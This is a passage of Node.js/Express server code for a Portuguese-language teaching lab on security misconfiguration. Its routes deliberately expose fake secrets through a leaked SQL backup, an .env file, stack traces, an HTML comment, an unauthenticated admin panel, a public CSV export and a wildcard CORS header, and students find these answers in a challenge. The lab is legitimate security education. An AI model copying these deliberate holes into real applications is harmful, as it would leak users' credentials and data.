                    <p id="contador-progresso" style="font-weight:bold; color:#0F766E;">0 / 10 concluídos</p>
                    <p>Clique em um teste para ver o passo a passo do ataque e responder o desafio.</p>
                    ${renderMenuMisconfig(sala)}
                    <button class="reset-btn" onclick="resetarProgressoMisconfig('${sala}')">🔄 Resetar Progresso do Lab ${sala}</button>
                    <a href="/misconfig/logout" class="nav-link">🚪 Sair (${escapeHtml(req.session.misconfigNomeExibicao || '')})</a>
                    <a href="/" class="nav-link">🏠 Voltar ao Hub</a>
                </div>

                <div class="main">
                    <div style="text-align: center; padding: 30px; background: linear-gradient(135deg, #0F766E 0%, #0B5D57 100%); color: white; border-radius: 8px; margin-bottom: 30px;">
                        <h1 style="margin: 0; font-size: 28px;">⚙️ Laboratório de Práticas — Lab ${sala}</h1>
                        <p style="margin: 10px 0 0 0; font-size: 16px; opacity: 0.9;">Misconfiguration e Exposição de Dados Sensíveis - Aula Prática de Segurança</p>
                    </div>

                    <div style="background: #e9f9f7; border-left: 4px solid #0F766E; padding: 20px; margin-bottom: 30px; border-radius: 4px;">
                        <h3 style="color: #0B5D57; margin-top: 0;">📚 Como Usar:</h3>
                        <ol style="color: #555; line-height: 1.8; margin: 10px 0;">
                            <li>Escolha um teste no menu lateral (👈 são 10 desafios diferentes) e leia "O que o aluno faz" e "Ação do ataque"</li>
                            <li>Acesse diretamente as URLs/telas indicadas — todos os exercícios podem ser resolvidos sem nenhuma ferramenta externa</li>
                            <li>Quando encontrar a informação pedida, cole a resposta no campo do próprio teste e clique em "Validar Resposta"</li>
                            <li>Se a resposta estiver certa, o teste é marcado com ✅ — seu progresso fica salvo no servidor</li>
                            <li>Se quiser recomeçar do zero, use o botão de reset mais abaixo no menu lateral (👇)</li>
                        </ol>
                    </div>

                    <div style="display: flex; gap: 15px; flex-wrap: wrap;">
                        <a href="/misconfig/${sala}/uploads" style="flex: 1; min-width: 190px; text-decoration: none; display: block; background: white; border: 2px solid #0F766E; border-radius: 8px; padding: 18px; text-align: center; color: #333; box-shadow: 0 2px 4px rgba(0,0,0,0.08);">
                            <div style="font-size: 28px;">📁</div>
                            <h4 style="margin: 8px 0 4px 0; color: #0F766E; font-size:14px;">Pasta de Uploads</h4>
                        </a>
                        <a href="/misconfig/${sala}/contato" style="flex: 1; min-width: 190px; text-decoration: none; display: block; background: white; border: 2px solid #0F766E; border-radius: 8px; padding: 18px; text-align: center; color: #333; box-shadow: 0 2px 4px rgba(0,0,0,0.08);">
                            <div style="font-size: 28px;">📞</div>
                            <h4 style="margin: 8px 0 4px 0; color: #0F766E; font-size:14px;">Contato</h4>
                        </a>
                        <a href="/misconfig/${sala}/status" style="flex: 1; min-width: 190px; text-decoration: none; display: block; background: white; border: 2px solid #0F766E; border-radius: 8px; padding: 18px; text-align: center; color: #333; box-shadow: 0 2px 4px rgba(0,0,0,0.08);">
                            <div style="font-size: 28px;">🩺</div>
                            <h4 style="margin: 8px 0 4px 0; color: #0F766E; font-size:14px;">Status / Debug</h4>
                        </a>
                        <a href="/misconfig/${sala}/diagnostico" style="flex: 1; min-width: 190px; text-decoration: none; display: block; background: white; border: 2px solid #0F766E; border-radius: 8px; padding: 18px; text-align: center; color: #333; box-shadow: 0 2px 4px rgba(0,0,0,0.08);">
                            <div style="font-size: 28px;">📡</div>
                            <h4 style="margin: 8px 0 4px 0; color: #0F766E; font-size:14px;">Diagnóstico</h4>
                        </a>
                    </div>
                </div>
            </div>
            <script>window.SALA_ATUAL = '${sala}';</script>
            <script>${scriptAccordionMisconfig}</script>
            <script>carregarProgressoDoServidorMisconfig('${sala}');</script>
        </body>
        </html>
    `);
});

// 2. Exercício 1 — backup de banco esquecido na pasta pública
app.get('/misconfig/:sala/backup-loja.sql', (req, res) => {
    const { sala } = req.params;
    const c = CONTEUDO_MISCONFIG[sala];
    res.type('text/plain').send(
`-- Backup automático gerado em 03/01/2024 02:00:11
-- Sistema: TechNova Sistemas — Banco de Dados (cópia de homologação)
BEGIN;

CREATE TABLE usuarios (id INTEGER, email VARCHAR(100), senha VARCHAR(50), perfil VARCHAR(20));

INSERT INTO usuarios (id, email, senha, perfil) VALUES
  (1, 'admin@technova-sistemas.com', '${c.backupSenha}', 'admin'),
  (2, 'suporte@technova-sistemas.com', 'Sup0rte#temp', 'user');

COMMIT;
-- FIM DO BACKUP
`);
});

// 3. Exercício 2 — arquivo .env exposto
app.get('/misconfig/:sala/.env', (req, res) => {
    const { sala } = req.params;
    const c = CONTEUDO_MISCONFIG[sala];
    res.type('text/plain').send(
`# Arquivo de configuração — NÃO deveria estar acessível publicamente
PORT=3000
NODE_ENV=homologacao
DB_HOST=db-interno.technova-sistemas.local
DB_USER=app_user
DB_PASS=********
API_KEY_PAGAMENTO=${c.envApiKey}
SESSION_SECRET=********
`);
});

// 4. Exercício 3 — listagem de diretório habilitada
app.get('/misconfig/:sala/uploads', (req, res) => {
    const { sala } = req.params;
    res.send(paginaMisconfig(sala, 'Index of /uploads', `
        <h1 style="font-size:18px; font-family:monospace;">Index of /misconfig/${sala}/uploads</h1>
        <hr>
        <ul style="font-family:monospace; line-height:1.8;">
            <li><a href="/misconfig/${sala}/uploads/contrato-cliente.pdf">contrato-cliente.pdf</a></li>
            <li><a href="/misconfig/${sala}/uploads/relatorio-financeiro-2024.txt">relatorio-financeiro-2024.txt</a></li>
            <li><a href="/misconfig/${sala}/uploads/foto-evento.jpg">foto-evento.jpg</a></li>
        </ul>
        <hr>
    `));
});

app.get('/misconfig/:sala/uploads/relatorio-financeiro-2024.txt', (req, res) => {
    const { sala } = req.params;
    const c = CONTEUDO_MISCONFIG[sala];
    res.type('text/plain').send(
`RELATÓRIO FINANCEIRO INTERNO — NÃO DIVULGAR
Trimestre: Q4 2024
Faturamento confidencial do trimestre: ${c.relatorioFaturamento}
`);
});

app.get('/misconfig/:sala/uploads/contrato-cliente.pdf', (req, res) => {
    res.type('text/plain').send('Arquivo de exemplo (sem conteúdo sensível) — usado apenas para simular a listagem de diretório.');
});

app.get('/misconfig/:sala/uploads/foto-evento.jpg', (req, res) => {
    res.type('text/plain').send('Arquivo de exemplo (sem conteúdo sensível) — usado apenas para simular a listagem de diretório.');
});

// 5. Exercício 4 — mensagem de erro detalhada (stack trace)
app.get('/misconfig/:sala/relatorio/:id', (req, res) => {
    const { sala, id } = req.params;
    const c = CONTEUDO_MISCONFIG[sala];
    if (!/^\d+$/.test(id)) {
        return res.status(500).type('text/plain').send(
`Error: Cannot find relatorio with id "${id}"
    at buscarRelatorio (/srv/technova/app/routes/relatorios.js:58:13)
    at conectarBanco (/srv/technova/app/db.js:42:9)
    at processarRequisicao (/srv/technova/app/server.js:301:5)

Banco de dados (ambiente de homologação):
postgres://relatorios_user:${c.stacktraceSenha}@10.0.4.12:5432/technova_homolog

NODE_ENV=homologacao | versao_app=2.3.1
`);
    }
    res.send(paginaMisconfig(sala, 'Relatório', `<p>📄 Relatório #${escapeHtml(id)} carregado normalmente. Nada de especial por aqui — tente um valor que não seja número.</p>`));
});

// 6. Exercício 5 — painel administrativo sem autenticação
app.get('/misconfig/:sala/painel-interno', (req, res) => {
    const { sala } = req.params;
    const c = CONTEUDO_MISCONFIG[sala];
    res.send(paginaMisconfig(sala, 'Painel Interno', `
        <h2>🏢 Painel Administrativo Interno — TechNova Sistemas</h2>
        <p style="color:#666;">Esta área é de uso exclusivo da equipe interna.</p>
        <div style="background:#e9f9f7; border-left:4px solid #0F766E; padding:15px; border-radius:4px; margin-top:15px;">
            <p><strong>Código de acesso ao cofre de documentos:</strong> ${escapeHtml(c.painelCofreCodigo)}</p>
            <p><strong>Funcionários ativos:</strong> 48</p>
            <p><strong>Último backup completo:</strong> 03/01/2024</p>
        </div>
    `));
});

// 7. Exercício 6 — credenciais esquecidas em comentário HTML
app.get('/misconfig/:sala/contato', (req, res) => {
    const { sala } = req.params;
    const c = CONTEUDO_MISCONFIG[sala];
    res.send(`
        <!DOCTYPE html>
        <html>
        <head><meta charset="UTF-8"><title>Fale Conosco - TechNova Sistemas</title></head>
        <body style="font-family: sans-serif; max-width: 800px; margin: 40px auto; padding: 20px;">
            <!-- TODO: remover usuário de teste antes de produção: qa_temp / ${c.comentarioSenhaQaTemp} -->
            <h2>📞 Fale Conosco</h2>
            <p>Preencha o formulário abaixo e nossa equipe responde em até 2 dias úteis.</p>
            <form>
                <label>Nome:</label><br><input type="text" style="width:100%; padding:8px; margin:6px 0;"><br>
                <label>Mensagem:</label><br><textarea style="width:100%; padding:8px; margin:6px 0;" rows="4"></textarea><br>
                <button type="button" disabled style="padding:10px 18px;">Enviar (desativado no laboratório)</button>
            </form>
            <br>
            <a href="/misconfig/${sala}" style="color:#0F766E; text-decoration:none;">← Voltar para o Laboratório</a>
        </body>
        </html>
    `);
});

// 8. Exercício 7 — endpoint de diagnóstico expõe dados internos
app.get('/misconfig/:sala/status', (req, res) => {
    const { sala } = req.params;
    const c = CONTEUDO_MISCONFIG[sala];
    res.json({
        status: 'ok',
        ambiente: 'homologacao',
        versao_node: process.version,
        servidor_interno: '10.0.4.12',
        chave_sessao_interna: c.statusChaveSessao
    });
});

// 9. Exercício 8 — cabeçalho de resposta revela informação de build interna
app.get('/misconfig/:sala/diagnostico', (req, res) => {
    const { sala } = req.params;
    const c = CONTEUDO_MISCONFIG[sala];
    res.set('X-Internal-Build', c.diagnosticoBuildHeader);
    res.send(paginaMisconfig(sala, 'Diagnóstico', `
        <h2>🩺 Diagnóstico do Servidor</h2>
        <p>Cabeçalhos enviados nesta resposta:</p>
        <pre style="background:#f5f5f5; padding:12px; border-radius:4px;">Content-Type: text/html
X-Internal-Build: ${escapeHtml(c.diagnosticoBuildHeader)}</pre>
    `));
});

// 10. Exercício 9 — exportação pública de dados sensíveis (CSV sem autenticação)
app.get('/misconfig/:sala/exportar/clientes.csv', (req, res) => {
    const { sala } = req.params;
    const c = CONTEUDO_MISCONFIG[sala];
    res.type('text/csv').send(
`nome,email,cpf,cartao_mascarado,observacao
Joao Pedro Lima,joao.lima@cliente.com,123.***.***-09,**** **** **** 4471,
Fernanda Costa,fernanda.costa@cliente.com,234.***.***-18,**** **** **** 2290,
Marcelo Tanaka (VIP),marcelo.tanaka@cliente.com,345.***.***-27,**** **** **** 8834,${c.csvVipCodigo}
Juliana Prado,juliana.prado@cliente.com,456.***.***-36,**** **** **** 1190,
`);
});

// 11. Exercício 10 — CORS mal configurado (Access-Control-Allow-Origin: *)
app.get('/misconfig/:sala/api/pedidos-internos', (req, res) => {
    const { sala } = req.params;
    const c = CONTEUDO_MISCONFIG[sala];
    res.set('Access-Control-Allow-Origin', '*');
    const dados = {
        pedidos: [
            { numero: 9001, item: 'Licença Corporativa Anual', valor: 4200.00 },
            { numero: 9002, item: 'Consultoria de Migração de Dados', valor: 18900.00 }
        ],
        nota_interna: c.apiNotaInterna
    };
    res.send(paginaMisconfig(sala, 'API de Pedidos Internos', `
        <h2>📦 API Interna de Pedidos</h2>
        <p>Esta API não exige login e devolve dados internos da empresa.</p>
        <h3>Resposta (JSON):</h3>
        <pre style="background:#f5f5f5; padding:12px; border-radius:4px;">${escapeHtml(JSON.stringify(dados, null, 2))}</pre>
        <h3>Cabeçalhos enviados nesta resposta:</h3>
        <pre style="background:#f5f5f5; padding:12px; border-radius:4px;">Access-Control-Allow-Origin: *</pre>
        <p>⚠️ Isso significa que um script rodando em <strong>qualquer site da internet</strong> pode chamar essa API com <code>fetch()</code> e ler essa resposta — não só o nosso laboratório.</p>
    `));
});

// 12. PROGRESSO — usado pelo dashboard para marcar os ✅ vindos do banco
app.get('/misconfig/:sala/progresso', async (req, res) => {
    const { sala } = req.params;
    try {
        const r = await pool.query('SELECT teste_id FROM misconfig_progresso WHERE sala=$1', [sala]);
        res.json({ concluidos: r.rows.map(row => row.teste_id) });
    } catch (error) {
        res.status(500).json({ concluidos: [], erro: error.message });
    }
});

// 13. VALIDAÇÃO DAS RESPOSTAS
app.post('/misconfig/:sala/validar', async (req, res) => {
    const { sala } = req.params;
    const { testeId, resposta } = req.body;
    const esperado = (RESPOSTAS_MISCONFIG[sala] || {})[testeId];
    if (!esperado) return res.status(400).json({ correto: false, erro: 'Teste desconhecido' });

    const correto = normalizarRespostaMisconfig(resposta) === normalizarRespostaMisconfig(esperado);

    if (correto) {
        try {
            await pool.query(
                'INSERT INTO misconfig_progresso (sala, teste_id) VALUES ($1, $2) ON CONFLICT (sala, teste_id) DO UPDATE SET concluido_em = NOW()',
                [sala, testeId]
            );
        } catch (error) {
            console.error('Erro ao registrar progresso de Misconfiguration:', error.message);
        }
    }

    res.json({ correto });
});

// 14. RESET DO PROGRESSO (não há outro dado mutável para restaurar neste lab)
app.post('/misconfig/:sala/reset', async (req, res) => {
    const { sala } = req.params;
    try {
        await pool.query('DELETE FROM misconfig_progresso WHERE sala=$1', [sala]);
        res.json({ sucesso: true, mensagem: `✅ Progresso do Lab ${sala} de Misconfiguration resetado com sucesso!` });
    } catch (error) {
        res.status(500).json({ sucesso: false, erro: error.message });
    }
});

// Inicialização da porta dinâmica (Render ou Local)
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🔥 Servidor do Laboratório iniciado com sucesso na porta ${PORT}`));
